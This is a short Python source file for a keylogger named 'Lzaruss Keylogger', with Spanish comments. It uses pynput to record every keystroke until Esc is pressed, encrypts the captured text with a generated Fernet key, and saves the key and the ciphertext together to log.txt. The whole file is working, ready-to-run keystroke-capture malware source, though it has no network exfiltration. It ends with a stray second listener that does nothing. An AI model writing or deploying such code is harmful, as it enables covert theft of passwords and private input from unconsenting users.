from pynput import keyboard
from cryptography.fernet import Fernet

class Keylogger:
    def __init__(self):
        self.head = 'Lzaruss Keylogger:'
        self.log = ''
        self.cifrado = None

    def on_press(self, key): # 
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.esc:
                # Stop listener
                self.save_data(self.log)
                return False

            if key == keyboard.Key.backspace:
                self.log = self.log[:-1]
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif key == keyboard.Key.space:
                self.log += " "
            else:
                self.log += str(key)

    def save_data(self, log: str):
        #vamos a probar vamos a probar
        log_b = log.encode("utf-8")
        cypher = self.cifrado.encrypt(log_b)
        with open("log.txt", "w", encoding='UTF-8') as f:
            f.write(self.head+str(cypher))

    def start(self):

        clave = Fernet.generate_key()
        self.cifrado = Fernet(clave)
        self.head += f'\n{clave}\n'

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

        listener = keyboard.Listener()
        listener.start()

Keylogger().start()